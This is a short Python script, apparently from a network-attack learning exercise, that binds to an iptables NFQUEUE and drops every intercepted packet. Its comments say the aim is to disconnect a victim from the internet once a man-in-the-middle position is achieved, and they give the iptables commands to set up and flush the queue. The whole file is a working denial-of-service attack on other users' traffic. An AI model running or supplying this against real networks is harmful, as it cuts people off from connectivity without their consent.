#!/usr/bin/env python

# iptables -I FORWARD -j NFQUEUE -- queue-num 0 <- **run command to create queue which we will bind to**
# If testing locally, -I INPUT, OUTPUT in two separate commands
# iptables --flush <- **Run this when you are done, or it will continue using the queue,and you don't want that**

import netfilterqueue


def process_packet(packet):
    print(packet)
    packet.drop() #<- **will disconnect user from internet once MnM is achieved**

queue= netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()


